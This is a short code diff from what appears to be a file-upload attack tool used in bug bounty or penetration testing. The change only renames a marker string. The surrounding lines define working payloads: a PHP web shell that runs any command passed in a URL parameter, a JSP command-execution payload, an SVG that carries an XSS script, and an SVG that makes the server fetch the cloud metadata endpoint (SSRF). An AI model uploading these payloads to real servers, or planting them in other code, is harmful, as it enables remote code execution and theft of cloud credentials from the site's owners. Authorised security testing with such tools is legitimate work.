@@ -9,7 +9,7 @@ import tempfile
 import urllib3
 urllib3.disable_warnings()
 
-PHP_SHELL = '<?php echo "BOUNTYCODE_RCE_TEST"; system($_GET["cmd"]); ?>'
+PHP_SHELL = '<?php echo "CYBERSTRIKE_RCE_TEST"; system($_GET["cmd"]); ?>'
 JSP_SHELL = '<%= Runtime.getRuntime().exec("id") %>'
 SVG_XSS = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>'
 SVG_SSRF = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>'
